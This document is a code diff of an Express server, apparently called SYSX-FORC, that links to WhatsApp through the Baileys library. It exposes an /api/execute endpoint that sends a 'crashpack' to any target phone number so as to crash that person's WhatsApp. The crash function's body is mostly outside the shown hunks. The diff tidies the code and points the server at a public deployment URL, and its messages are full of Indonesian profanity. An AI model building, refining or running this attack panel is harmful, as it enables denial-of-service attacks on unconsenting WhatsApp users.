@@ -12,14 +12,12 @@ dotenv.config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// === MIDDLEWARE FORCE JSON ===
+// === MIDDLEWARE ===
 app.use((req, res, next) => {
-    // Set header JSON untuk semua response
     res.setHeader('Content-Type', 'application/json');
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-    
     if (req.method === 'OPTIONS') {
         return res.status(200).json({ status: 'OK' });
     }
@@ -28,26 +26,16 @@ app.use((req, res, next) => {
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
-
-// === STATIC FILE UNTUK FRONTEND ===
 app.use(express.static(path.join(__dirname, 'public')));
 
-// === ERROR HANDLER JSON ===
+// === ERROR HANDLER ===
 app.use((err, req, res, next) => {
     console.error('🔥 ERROR SADIS:', err.message);
-    res.status(500).json({ 
-        success: false, 
-        error: err.message || 'Internal Server Error, BANGSAT!' 
-    });
+    res.status(500).json({ success: false, error: err.message || 'Internal Error, BANGSAT!' });
 });
 
-// === 404 HANDLER ===
 app.use((req, res) => {
-    res.status(404).json({ 
-        success: false, 
-        error: 'NOT_FOUND', 
-        message: `Endpoint ${req.path} gak ditemukan, KONTOL!` 
-    });
+    res.status(404).json({ success: false, error: 'NOT_FOUND', message: `Endpoint ${req.path} gak ditemukan, KONTOL!` });
 });
 
 // === GLOBAL VARIABLE ===
@@ -55,9 +43,8 @@ let sock = null;
 let isConnected = false;
 let pairCode = '';
 let qrCode = '';
-let authState = null;
 
-// === FUNGSI CRASHER (YANG LU KASIH) ===
+// === FUNCTION CRASH ===
 async function crashpack(sock, jid) {
     try {
         const proto = require('@whiskeysockets/baileys').proto;
@@ -154,8 +141,6 @@ async function crashpack(sock, jid) {
 async function connectBaileys() {
     try {
         const { state, saveCreds } = await useMultiFileAuthState('auth_info');
-        authState = state;
-
         sock = makeWASocket({
             version: [2, 3000, 1015901307],
             auth: state,
@@ -165,21 +150,17 @@ async function connectBaileys() {
         });
 
         sock.ev.on('creds.update', saveCreds);
-
         sock.ev.on('connection.update', (update) => {
             const { connection, lastDisconnect, qr } = update;
-            
             if (qr) {
                 qrCode = qr;
                 QRCode.generate(qr, { small: true });
                 console.log('✅ QR CODE GENERATED');
             }
-
             if (connection === 'open') {
                 isConnected = true;
                 console.log('✅ CONNECTED TO WHATSAPP');
             }
-
             if (connection === 'close') {
                 isConnected = false;
                 const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
@@ -203,110 +184,60 @@ async function connectBaileys() {
 }
 
 // === API ENDPOINTS ===
-
-// 1. LOGIN
 app.post('/api/login', (req, res) => {
-    try {
-        const { password } = req.body;
-        if (password === process.env.PASSWORD) {
-            res.json({ success: true, message: 'Login berhasil, BANGSAT!' });
-        } else {
-            res.status(401).json({ success: false, message: 'Password salah, KONTOL!' });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
+    const { password } = req.body;
+    if (password === process.env.PASSWORD) {
+        res.json({ success: true, message: 'Login berhasil, BANGSAT!' });
+    } else {
+        res.status(401).json({ success: false, message: 'Password salah, KONTOL!' });
     }
 });
 
-// 2. STATUS
 app.get('/api/status', async (req, res) => {
-    try {
-        if (!sock) {
-            await connectBaileys();
-        }
-        res.json({
-            connected: isConnected,
-            qr: qrCode || null,
-            pairCode: pairCode || null
-        });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
+    if (!sock) await connectBaileys();
+    res.json({ connected: isConnected, qr: qrCode || null, pairCode: pairCode || null });
 });
 
-// 3. PAIR CODE
 app.post('/api/pair', async (req, res) => {
-    try {
-        const { number } = req.body;
-        if (!number) {
-            return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi, ANJING!' });
-        }
-
-        if (!sock) {
-            await connectBaileys();
-        }
-        
-        const code = await sock.requestPairingCode(number);
-        pairCode = code;
-        res.json({ success: true, pairCode: code });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
+    const { number } = req.body;
+    if (!number) return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi, ANJING!' });
+    if (!sock) await connectBaileys();
+    const code = await sock.requestPairingCode(number);
+    pairCode = code;
+    res.json({ success: true, pairCode: code });
 });
 
-// 4. EXECUTE CRASH
 app.post('/api/execute', async (req, res) => {
-    try {
-        const { target } = req.body;
-        
-        if (!target) {
-            return res.status(400).json({ success: false, error: 'Target nomor WA wajib diisi, BANGSAT!' });
-        }
-
-        if (!sock || !isConnected) {
-            return res.status(500).json({ success: false, error: 'WA belum connect, coba pair dulu!' });
-        }
-
-        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
-        const result = await crashpack(sock, jid);
-        
-        if (result.success) {
-            res.json({ success: true, message: `✅ CRASH BERHASIL ke ${target}!` });
-        } else {
-            res.status(500).json({ success: false, error: result.error });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
+    const { target } = req.body;
+    if (!target) return res.status(400).json({ success: false, error: 'Target nomor WA wajib diisi, BANGSAT!' });
+    if (!sock || !isConnected) return res.status(500).json({ success: false, error: 'WA belum connect, coba pair dulu!' });
+    
+    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
+    const result = await crashpack(sock, jid);
+    if (result.success) {
+        res.json({ success: true, message: `✅ CRASH BERHASIL ke ${target}!` });
+    } else {
+        res.status(500).json({ success: false, error: result.error });
     }
 });
 
-// 5. LOGOUT
 app.post('/api/logout', async (req, res) => {
-    try {
-        if (sock) {
-            await sock.logout();
-            isConnected = false;
-            sock = null;
-            authState = null;
-            qrCode = '';
-            pairCode = '';
-            
-            if (fs.existsSync('auth_info')) {
-                fs.rmSync('auth_info', { recursive: true, force: true });
-            }
+    if (sock) {
+        await sock.logout();
+        isConnected = false;
+        sock = null;
+        qrCode = '';
+        pairCode = '';
+        if (fs.existsSync('auth_info')) {
+            fs.rmSync('auth_info', { recursive: true, force: true });
         }
-        res.json({ success: true, message: 'Logout berhasil, GOBLOK!' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
     }
+    res.json({ success: true, message: 'Logout berhasil, GOBLOK!' });
 });
 
-// === START SERVER ===
+// === START ===
 connectBaileys();
-
 app.listen(PORT, () => {
     console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
-    console.log(`👿 LU BISA AKSES DI http://localhost:${PORT}`);
+    console.log(`👿 URL: https://brogia.up.railway.app`);
 });
-
-module.exports = app;
